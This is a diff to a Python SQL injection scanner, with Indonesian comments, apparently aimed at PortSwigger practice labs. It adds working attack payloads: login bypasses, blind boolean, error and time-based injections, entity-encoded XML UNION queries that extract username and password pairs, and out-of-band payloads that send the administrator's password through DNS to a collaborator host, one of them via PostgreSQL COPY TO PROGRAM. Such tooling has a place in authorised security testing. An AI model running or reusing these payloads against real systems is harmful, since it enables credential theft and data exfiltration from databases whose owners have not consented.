@@ -1663,7 +1663,7 @@ _LAB_TAG_SET_OVERRIDES: dict[str, frozenset] = {
     "sql_injection-14": frozenset({"sql_injection", "blind", "time_based"}),
     "sql_injection-15": frozenset({"sql_injection", "blind", "time_based"}),
     "sql_injection-16": frozenset({"sql_injection", "oob"}),
-    "sql_injection-17": frozenset({"sql_injection", "oob"}),
+    "sql_injection-17": frozenset({"sql_injection", "oob", "oob_exfil"}),
     "sql_injection-18": frozenset({"sql_injection", "xml_encoded"}),
 }
 
@@ -2130,6 +2130,15 @@ SQL_ERROR_SIGNATURES = [
     ("mssql", "unclosed quotation mark after the character string"),
     ("oracle", "ora-01756"),
     ("oracle", "quoted string not properly terminated"),
+    ("postgresql", "invalid input syntax for"),
+    ("postgresql", "syntax error at or near"),
+    ("mysql", "sql syntax; check the manual"),
+    ("mssql", "conversion failed when converting"),
+    ("oracle", "ora-00933"),
+    ("oracle", "ora-00904"),
+    ("oracle", "ora-00907"),
+    ("oracle", "ora-01789"),
+    ("oracle", "ora-01790"),
     ("generic", "sql syntax"),
     ("generic", "sqlstate["),
 ]
@@ -3444,7 +3453,11 @@ def _sqli_points(ctx):
             continue
         seen.add(key)
         out.append(point)
-    return out[:SQLI_MAX_POINTS]
+    # Cookie lebih dulu: lab blind SQLi PortSwigger menyuntik cookie TrackingId,
+    # sedangkan parameter query di halaman yang sama hanya noise.
+    cookies = [pt for pt in out if pt["kind"] == "cookie"]
+    others = [pt for pt in out if pt["kind"] != "cookie"]
+    return (cookies[:2] + others + cookies[2:])[:SQLI_MAX_POINTS]
 
 
 def _sqli_value(point, suffix: str) -> str:
@@ -3524,15 +3537,61 @@ def _sqli_bool_ok(base, resp_true, resp_false) -> bool:
     return True
 
 
+_VOLATILE_RE = re.compile(r"\b(?:[a-f0-9]{12,}|[A-Za-z0-9+/=_-]{24,})\b")
+
+
+def _sqli_plain(resp) -> str:
+    """Teks respons tanpa token volatil (CSRF/session) agar diff stabil."""
+    text = _sqli_body(resp).lower()
+    text = re.sub(r"<script[^>]*>.*?</script>", " ", text, flags=re.S)
+    text = re.sub(r"<input[^>]*type=[\"']?hidden[\"']?[^>]*>", " ", text)
+    text = _VOLATILE_RE.sub(" ", text)
+    return re.sub(r"\s+", " ", text).strip()
+
+
+def _sqli_bool_text(base_plain, true_plain, false_plain) -> bool:
+    """TRUE/FALSE berbeda isi teks, bukan hanya panjang.
+
+    Lab SQLi PortSwigger menandai kondisi TRUE dengan teks kecil seperti
+    "Welcome back!" (belasan byte) sehingga ambang ukuran saja melewatkannya.
+    Hanya pola stabil yang diterima: salah satu respons identik dengan baseline
+    dan respons lain menambah atau menghapus isi.
+    """
+    if not (base_plain and true_plain and false_plain):
+        return False
+    if true_plain == false_plain:
+        return False
+    if false_plain == base_plain:
+        return len(true_plain) - len(false_plain) >= 5
+    if true_plain == base_plain:
+        return len(false_plain) < len(true_plain)
+    return False
+
+
+def _sqli_bool_text_ok(base, resp_true, resp_false) -> bool:
+    if resp_true is None or resp_false is None:
+        return False
+    if not (resp_true.status_code == resp_false.status_code == base.status_code):
+        return False
+    if _sqli_dbms(resp_true)[0] or _sqli_dbms(resp_false)[0]:
+        return False
+    return _sqli_bool_text(_sqli_plain(base), _sqli_plain(resp_true), _sqli_plain(resp_false))
+
+
 def _sqli_boolean_phase(sess, ctx, point, base, out):
     for true_payload, false_payload in SQLI_BOOLEAN_PAIRS:
         hits = 0
         len_true = len_false = 0
+        text_signal = False
         for _ in range(2):
             resp_true = _sqli_send(sess, ctx, point, _sqli_value(point, true_payload))
             resp_false = _sqli_send(sess, ctx, point, _sqli_value(point, false_payload))
             if _sqli_bool_ok(base, resp_true, resp_false):
                 hits += 1
+                len_true, len_false = _sqli_len(resp_true), _sqli_len(resp_false)
+            elif _sqli_bool_text_ok(base, resp_true, resp_false):
+                hits += 1
+                text_signal = True
                 len_true, len_false = _sqli_len(resp_true), _sqli_len(resp_false)
         if hits == 2:
             out.append(_sqli_finding(
@@ -3540,7 +3599,9 @@ def _sqli_boolean_phase(sess, ctx, point, base, out):
                 f"Blind SQL injection (respons kondisional) pada {point['label']}", "high",
                 f"Payload TRUE {true_payload!r} mengembalikan {len_true} byte (normal) sedangkan "
                 f"payload FALSE {false_payload!r} mengembalikan {len_false} byte; pola ini "
-                "berulang pada dua percobaan.",
+                "berulang pada dua percobaan."
+                + (" Perbedaan isi teks (bukan hanya ukuran) terdeteksi pada kondisi TRUE."
+                   if text_signal else ""),
                 "active_sqli_boolean_differential"))
             return
 
@@ -3553,6 +3614,8 @@ SQLI_COND_ERROR_PAIRS = [
      "1 AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1"),
     ("' AND 1=(SELECT CASE WHEN (1=1) THEN CAST('x' AS int) ELSE 1 END)-- -",
      "' AND 1=(SELECT CASE WHEN (1=2) THEN CAST('x' AS int) ELSE 1 END)-- -"),
+    ("'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
+     "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"),
 ]
 
 
@@ -3588,6 +3651,8 @@ SQLI_TIME_PAYLOADS = [
     ("mssql", "1;WAITFOR DELAY '0:0:{d}'--"),
     ("oracle", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{d})--"),
     ("oracle", "'||(SELECT dbms_pipe.receive_message(('a'),{d}) FROM dual)||'"),
+    ("oracle", "'||(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),{d}) "
+               "ELSE NULL END FROM dual)||'"),
 ]
 
 
@@ -3695,11 +3760,14 @@ def _sqli_union_phase(sess, ctx, point, base, out):
     base_body = _sqli_body(base)
     if text_index >= 0:
         # a) versi DBMS
+        # Urutan penting: Oracle hanya mengenal v$version, MySQL/MSSQL sama-sama
+        # memakai @@version, dan PostgreSQL memakai version(). Menaruh version()
+        # lebih dulu membuat lab MySQL salah diatribusikan tanpa tag mysql_mssql.
         version_specs = [
-            ("postgresql", "version()", ""),
+            ("oracle", "banner", " FROM v$version"),
             ("mysql", "@@version", ""),
             ("mssql", "@@version", ""),
-            ("oracle", "banner", " FROM v$version"),
+            ("postgresql", "version()", ""),
         ]
         for dbms, expr, suffix in version_specs:
             payload = _sqli_union_payload(point, columns, text_index, expr, suffix)
@@ -3789,6 +3857,7 @@ def _sqli_union_phase(sess, ctx, point, base, out):
 
 # ── 7. login bypass ─────────────────────────────────────────────────────────
 SQLI_LOGIN_PAYLOADS = ["' OR 1=1-- -", "' OR '1'='1", "administrator'-- -",
+                       "administrator'--", "administrator'#", "' OR 1=1--",
                        "admin' OR '1'='1'-- -", "' OR 1=1#"]
 SQLI_LOGIN_SUCCESS = ("log out", "logout", "sign out", "my account", "your username is",
                       "update email", "account details")
@@ -3844,18 +3913,30 @@ def _sqli_login_phase(sess, ctx, out):
 
 # ── 8. XML / filter bypass via entity encoding ──────────────────────────────
 def _sqli_xml_endpoints(ctx):
-    js = ctx.js_text or ""
-    if not re.search(r"<(stockCheck|productId|storeId|checkStock|soap)", js + (ctx.html or ""), re.I):
+    haystack = (ctx.js_text or "") + "\n" + (ctx.html or "")
+    if not re.search(r"(stockCheck|storeId|productId|checkStock|\bsoap\b)", haystack, re.I):
         return []
     origin = urlparse(ctx.url).netloc.lower()
     found = []
-    for match in re.finditer(r"""(?:fetch|axios\.post|\.open)\s*\(\s*['"]([^'"]{1,200})['"]""", js):
+    for match in re.finditer(r"""(?:fetch|axios\.post|\.open)\s*\(\s*['"]([^'"]{1,200})['"]""", haystack):
         url = ctx.abs_url(match.group(1))
         if urlparse(url).netloc.lower() != origin:
             continue
         if re.search(r"(stock|xml|soap|inventory|check)", url, re.I):
             found.append(url)
+    if not found and re.search(r"/product", urlparse(ctx.url).path, re.I):
+        found.append(ctx.abs_url("/product/stock"))
     return list(dict.fromkeys(found))[:2]
+
+
+def _sqli_xml_blocked(resp) -> bool:
+    if resp is None:
+        return False
+    body = _sqli_body(resp).lower()
+    if any(word in body for word in ("attack detected", "blocked", "forbidden",
+                                     "not allowed", "access denied", "invalid input")):
+        return True
+    return resp.status_code in (400, 401, 403, 406, 409, 429)
 
 
 def _sqli_xml_phase(sess, ctx, out):
@@ -3868,29 +3949,38 @@ def _sqli_xml_phase(sess, ctx, out):
                               headers={"Content-Type": "application/xml"})
         if baseline is None:
             return
-        literal = base_xml.replace("<storeId>1</storeId>",
-                                   "<storeId>1 UNION SELECT NULL</storeId>")
-        encoded = base_xml.replace("<storeId>1</storeId>",
-                                   "<storeId>1 &#x55;NION &#x53;ELECT NULL</storeId>")
+        literal = base_xml.replace(
+            "<storeId>1</storeId>",
+            "<storeId>1 UNION SELECT 'CANARY'||username||'~'||password FROM users</storeId>")
+        encoded = base_xml.replace(
+            "<storeId>1</storeId>",
+            "<storeId>1 &#x55;NION &#x53;ELECT 'CANARY'||username||'~'||password FROM users</storeId>")
         resp_literal = _sqli_http(sess, ctx, "POST", url, data=literal,
                                   headers={"Content-Type": "application/xml"})
         resp_encoded = _sqli_http(sess, ctx, "POST", url, data=encoded,
                                   headers={"Content-Type": "application/xml"})
         if resp_literal is None or resp_encoded is None:
             return
-        blocked_literal = (resp_literal.status_code in (400, 403, 406, 429)
-                           or "blocked" in _sqli_body(resp_literal).lower()
-                           or "not acceptable" in _sqli_body(resp_literal).lower())
-        advanced_encoded = (resp_encoded.status_code != resp_literal.status_code
-                            or _sqli_len(resp_encoded) != _sqli_len(resp_literal))
-        if blocked_literal and advanced_encoded:
+        creds_encoded = SQLI_CRED_RE.search(_sqli_body(resp_encoded))
+        blocked_literal = _sqli_xml_blocked(resp_literal)
+        accepted_encoded = resp_encoded.status_code < 400
+        if blocked_literal and (accepted_encoded or creds_encoded):
             out.append(_sqli_finding(
                 ctx, {"xml_encoded"},
                 "SQL injection dengan bypass filter melalui XML entity encoding", "high",
-                f"Payload literal ditolak (HTTP {resp_literal.status_code}) tetapi versi "
-                f"entity-encoded diterima/diproses berbeda (HTTP {resp_encoded.status_code}, "
-                f"{_sqli_len(resp_encoded)} byte) pada {url}.",
+                f"Body XML literal ditolak (HTTP {resp_literal.status_code}) tetapi versi "
+                f"entity-encoded (&#x55;NION &#x53;ELECT) diproses (HTTP "
+                f"{resp_encoded.status_code}) pada {url}."
+                + (f" Kredensial terbaca: '{creds_encoded.group(1)}'." if creds_encoded else ""),
                 "active_sqli_xml_entity_bypass"))
+            return
+        if creds_encoded:
+            out.append(_sqli_finding(
+                ctx, {"xml_encoded"},
+                "SQL injection pada body XML — data tabel lain terbaca", "high",
+                f"Body XML ke {url} mengembalikan pasangan kredensial "
+                f"'{creds_encoded.group(1)}' dari query yang disuntikkan.",
+                "active_sqli_xml_credentials"))
             return
         if _sqli_dbms(resp_encoded)[0] and not _sqli_dbms(baseline)[0]:
             out.append(_sqli_finding(
@@ -3906,52 +3996,104 @@ def _sqli_xml_phase(sess, ctx, out):
 def _sqli_oast_poll() -> list[str]:
     if not SQLI_OAST_API:
         return []
-    interactions: list[str] = []
-    for _ in range(3):
+    chunks: list[str] = []
+    for _ in range(4):
         try:
             resp = requests.get(SQLI_OAST_API, timeout=6, headers={"User-Agent": UA})
             if resp.ok:
-                interactions.append(resp.text[:4000])
+                chunks.append(resp.text[:8000])
         except Exception:
             pass
         time.sleep(2)
-    return interactions
+    return chunks
+
+
+def _sqli_oast_hosts(chunks) -> set[str]:
+    domain = SQLI_OAST_DOMAIN
+    if not domain:
+        return set()
+    pattern = re.compile(r"[a-z0-9][a-z0-9._-]{0,120}\." + re.escape(domain), re.I)
+    hosts = set()
+    for chunk in chunks:
+        for match in pattern.finditer(chunk or ""):
+            hosts.add(match.group(0).lower().strip("."))
+    return hosts
+
+
+def _sqli_oob_payloads(token: str, domain: str):
+    """Payload (interaksi, exfiltrasi) untuk Oracle, MSSQL, MySQL, PostgreSQL.
+
+    Payload exfiltrasi menaruh hasil subquery pada label DNS di depan domain
+    collaborator, sehingga nilainya terbaca dari log interaksi OAST.
+    """
+    marker = token + "." + domain
+    data = "(SELECT password FROM users WHERE username='administrator')"
+    interaction = [
+        ("oracle", "' AND (SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root "
+                   "[<!ENTITY % r SYSTEM \"http://" + marker + "/\">%r;]>'),'/l') FROM dual) IS NOT NULL--"),
+        ("oracle", "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root "
+                   "[<!ENTITY % r SYSTEM \"http://" + marker + "/\">%r;]>'),'/l') FROM dual--"),
+        ("mssql", "'; DECLARE @q varchar(200); SET @q='\\\\" + marker + "\\a'; EXEC master..xp_dirtree @q--"),
+        ("mysql", "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\" + marker + "\\\\a')))-- -"),
+        ("postgresql", "'; COPY (SELECT '') TO PROGRAM 'nslookup " + marker + "'--"),
+    ]
+    exfil = [
+        ("oracle", "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root "
+                   "[<!ENTITY % r SYSTEM \"http://" + token + ".'||" + data + "||'." + domain
+                   + "/\">%r;]>'),'/l') FROM dual--"),
+        ("oracle", "' AND (SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root "
+                   "[<!ENTITY % r SYSTEM \"http://" + token + ".'||" + data + "||'." + domain
+                   + "/\">%r;]>'),'/l') FROM dual) IS NOT NULL--"),
+        ("mssql", "'; DECLARE @q varchar(200); SET @q='\\\\" + token + ".'+" + data + "+'." + domain
+                  + "\\a'; EXEC master..xp_dirtree @q--"),
+        ("mysql", "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\" + token + ".'," + data + ",'."
+                  + domain + "\\\\a')))-- -"),
+    ]
+    return interaction, exfil
 
 
 def _sqli_oob_phase(sess, ctx, points, out):
     domain = SQLI_OAST_DOMAIN
     if not domain or not points:
         return
-    payloads = [
-        ("mssql", "'; DECLARE @q varchar(200); SET @q='\\\\'+(SELECT @@version)+'." + domain +
-                  "\\a'; EXEC master..xp_dirtree @q--"),
-        ("oracle", "' AND (SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root "
-                   "[<!ENTITY % r SYSTEM \"http://" + domain + "/\">%r;]>'),'/l') FROM dual)--"),
-        ("mysql", "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'." + domain +
-                  "\\\\a')))-- -"),
-        ("postgresql", "'; COPY (SELECT '') TO PROGRAM 'nslookup " + domain + "'--"),
-    ]
+    token = "satria" + os.urandom(4).hex()
+    interaction, exfil = _sqli_oob_payloads(token, domain)
     sent = 0
-    for point in points[:3]:
-        for _dbms, payload in payloads:
+    for point in points[:4]:
+        for _dbms, payload in interaction + exfil:
             if _sqli_send(sess, ctx, point, _sqli_value(point, payload)) is not None:
                 sent += 1
     if not sent:
         return
-    hits = _sqli_oast_poll()
-    if any(domain in hit.lower() for hit in hits):
+    hosts = _sqli_oast_hosts(_sqli_oast_poll())
+    marker = token + "." + domain
+    leaked = [h for h in hosts if h != marker and h.startswith(token + ".") and h.endswith("." + domain)]
+    if leaked:
+        host = sorted(leaked)[0]
+        middle = host[: -(len(domain) + 1)]
+        value = middle[len(token) + 1:] if middle.startswith(token + ".") else ""
+        preview = value[:2] + "*" * max(0, len(value) - 2)
+        out.append(_sqli_finding(
+            ctx, {"oob", "oob_exfil"},
+            "Blind SQL injection dengan exfiltrasi data out-of-band", "critical",
+            "Payload exfiltrasi menaruh hasil subquery (SELECT password ... WHERE "
+            f"username='administrator') pada label DNS; collaborator menerima interaksi {host!r}. "
+            f"Nilai terbaca {len(value)} karakter (prefix {preview!r}, sisanya disamarkan).",
+            "active_sqli_oob_exfiltration"))
+        return
+    if hosts:
         out.append(_sqli_finding(
             ctx, {"oob"},
             "Blind SQL injection dengan interaksi out-of-band terkonfirmasi", "high",
-            f"Payload DNS/UNC ke domain collaborator {domain} memicu interaksi yang tercatat "
-            "pada endpoint OAST.",
+            f"Payload DNS/UNC ke domain collaborator {domain} memicu {len(hosts)} interaksi "
+            f"yang tercatat pada endpoint OAST (mis. {sorted(hosts)[0]!r}).",
             "active_sqli_oob_interaction"))
         return
     out.append(_sqli_finding(
         ctx, {"oob"},
         "SQL injection out-of-band dikirim, menunggu interaksi collaborator", "medium",
-        f"{sent} payload OOB dikirim ke domain {domain}; interaksi belum terlihat pada "
-        "endpoint OAST sehingga exfiltrasi belum terbukti.",
+        f"{sent} payload OOB (interaksi + exfiltrasi) dikirim ke domain {domain}; interaksi "
+        "belum terlihat pada endpoint OAST sehingga exfiltrasi belum terbukti.",
         "active_sqli_oob_pending", confidence="candidate"))
 
 
@@ -4775,7 +4917,7 @@ PROVABLE_TAGS: frozenset = frozenset({
     "where", "oracle", "mysql_mssql", "db_dump", "db_version", "column_count",
     "text_column", "other_tables", "multi_value", "conditional_responses",
     "conditional_errors", "xml_encoded", "information_schema", "all_tables",
-    "oob",
+    "oob", "oob_exfil",
     "unkeyed_header", "null_origin", "protocol_confusion", "no_csrf_defense",
     "java_gadget", "php_object", "ruby_gadget", "serialized_object", "dom_clobbering",
     "open_redirect", "cookie_manipulation", "content_type_bypass", "webshell",
